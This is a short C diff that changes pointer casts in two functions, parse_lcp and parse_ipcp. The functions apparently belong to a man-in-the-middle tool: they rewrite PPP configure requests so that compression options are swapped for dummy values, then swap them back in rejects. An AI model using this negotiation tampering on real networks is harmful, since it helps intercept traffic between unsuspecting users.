@@ -123,18 +123,18 @@ static void parse_lcp(struct packet_object *po)
    lcp = (struct ppp_lcp_header *)po->L4.header;
 
    if ( lcp->code == PPP_CONFIGURE_REQUEST) {
-      if ( (option = (u_char *)parse_option( (char *)(lcp + 1), PPP_REQUEST_FCOMP, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
+      if ( (option = (u_char *)parse_option( (u_char *)(lcp + 1), PPP_REQUEST_FCOMP, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
          option[0] = PPP_REQUEST_DUMMY1;      
       
-      if ( (option = (u_char *)parse_option( (char *)(lcp + 1), PPP_REQUEST_ACOMP, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
+      if ( (option = (u_char *)parse_option( (u_char *)(lcp + 1), PPP_REQUEST_ACOMP, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
          option[0] = PPP_REQUEST_DUMMY2;      
    }
 
    if ( lcp->code == PPP_CONFIGURE_REJ) {
-      if ( (option = (u_char *)parse_option( (char *)(lcp + 1), PPP_REQUEST_DUMMY1, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
+      if ( (option = (u_char *)parse_option( (u_char *)(lcp + 1), PPP_REQUEST_DUMMY1, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
          option[0] = PPP_REQUEST_FCOMP;      
       
-      if ( (option = (u_char *)parse_option( (char *)(lcp + 1), PPP_REQUEST_DUMMY2, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
+      if ( (option = (u_char *)parse_option( (u_char *)(lcp + 1), PPP_REQUEST_DUMMY2, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
          option[0] = PPP_REQUEST_ACOMP;      
    }
 }
@@ -167,11 +167,11 @@ static void parse_ipcp(struct packet_object *po)
    lcp = (struct ppp_lcp_header *)po->L4.header;
 
    if ( lcp->code == PPP_CONFIGURE_REQUEST) 
-      if ( (option = (u_char *)parse_option( (char *)(lcp + 1), PPP_REQUEST_VJC, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
+      if ( (option = (u_char *)parse_option( (u_char *)(lcp + 1), PPP_REQUEST_VJC, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
          option[0] = PPP_REQUEST_DUMMY1;      
           
    if ( lcp->code == PPP_CONFIGURE_REJ)
-      if ( (option = (u_char *)parse_option( (char *)(lcp + 1), PPP_REQUEST_DUMMY1, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
+      if ( (option = (u_char *)parse_option( (u_char *)(lcp + 1), PPP_REQUEST_DUMMY1, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
          option[0] = PPP_REQUEST_VJC;      
 }
 
